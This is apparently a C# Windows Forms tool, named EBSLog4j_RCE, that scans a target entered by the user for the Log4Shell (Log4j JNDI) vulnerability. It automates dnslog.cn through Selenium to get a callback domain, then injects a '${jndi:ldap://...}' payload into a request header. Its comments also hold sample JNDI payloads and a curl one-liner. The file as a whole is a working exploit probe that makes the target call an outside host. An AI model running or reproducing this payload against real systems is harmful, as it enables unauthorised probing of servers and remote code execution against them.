using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Net.Http;
using System.Threading;
using System.Windows.Forms;

namespace EBSLog4j_RCE
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        ChromeDriver drv; Thread th;
        private string url;
        private string gelenistek;

        private void button1_Click(object sender, EventArgs e)
        {
            EBScanner();
        }
        //${jndi:ldap://tr15d9.dnslog.cn}
        //curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xznsqe.dnslog.cn}'  
        async void EBScanner()
        {
            url = "http://" + textBox1.Text;
            using (var httpClient = new HttpClient())
            {
                using (var request = new HttpRequestMessage(new HttpMethod("GET"), "" + url + ""))
                {
                    request.Headers.TryAddWithoutValidation("Mozilla/5.0 (Linux; {Android Version}; {Build Tag etc.}) \nAppleWebKit/{WebKit Rev} (KHTML, like Gecko)\nChrome/{Chrome Rev} Mobile Safari/{WebKit Rev}", "${jndi:" + textBox3.Text + "://" + textBox2.Text + "}");

                    var response = await httpClient.SendAsync(request);
                    gelenistek = response.Content.ReadAsStringAsync().Result;//İlerdeki işlemler için bırakıyorum...
                }
            }
            Thread.Sleep(5000);
            for (int i = 0; i < drv.FindElements(By.XPath("//table[@id='myRecords']//td")).Count; i++)
            {
                richTextBox1.AppendText(drv.FindElements(By.XPath("//table[@id='myRecords']//td"))[i].Text + "\r");
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            th = new Thread(ebs); th.Start();
        }

        private void ebs()
        {
            drv = new ChromeDriver();
            drv.Navigate().GoToUrl("http://www.dnslog.cn/");
        git: if (drv.PageSource.IndexOf("DNS Query Record") != -1)
            {
                drv.FindElement(By.XPath("//button[@onclick='GetDomain()']")).Click();
                Thread.Sleep(3000);
                textBox2.Text = drv.FindElement(By.XPath("//div[@id='myDomain']")).Text;
            }
            else
            {
                goto git;
            }
        }
    }
}
